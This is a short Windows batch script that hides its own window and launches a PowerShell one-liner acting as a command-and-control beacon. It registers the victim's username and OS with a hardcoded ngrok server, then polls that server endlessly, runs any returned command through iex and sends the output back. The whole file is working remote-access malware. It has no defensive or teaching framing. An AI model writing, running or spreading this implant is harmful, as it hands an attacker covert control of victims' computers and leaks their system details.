@echo off
:: Hide command window
if "%~1"=="h" goto :hidden
start /min cmd /c "%~f0" h
goto :eof
:hidden

:: Configuration
:: Configuration
set "SERVER=https://99c28df58ae1.ngrok-free.app"
:: In production, this would be the Ngrok URL
:: set "SERVER=https://YOUR_NGROK.ngrok-free.app"

:: Create a unique ID
set "UID=%USERNAME%-%RANDOM%"

:: PowerShell One-Liner for Beaconing
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s=$env:SERVER; $uid=$env:UID; $info=@{user=$env:USERNAME; os=(Get-WmiObject Win32_OperatingSystem).Caption}; try { Invoke-RestMethod -Uri \"$s/api/c2/register\" -Method Post -Body (ConvertTo-Json @{uid=$uid; info=$info}) -ContentType 'application/json' -ErrorAction Stop } catch { exit }; while($true) { try { $cmd = (Invoke-RestMethod -Uri \"$s/api/c2/poll\" -Method Post -Body (ConvertTo-Json @{uid=$uid}) -ContentType 'application/json' -ErrorAction Stop).command; if($cmd) { $out = iex $cmd 2>&1 | Out-String; Invoke-RestMethod -Uri \"$s/api/c2/response\" -Method Post -Body (ConvertTo-Json @{uid=$uid; output=$out}) -ContentType 'application/json' } } catch {} Start-Sleep -Seconds 2 }"
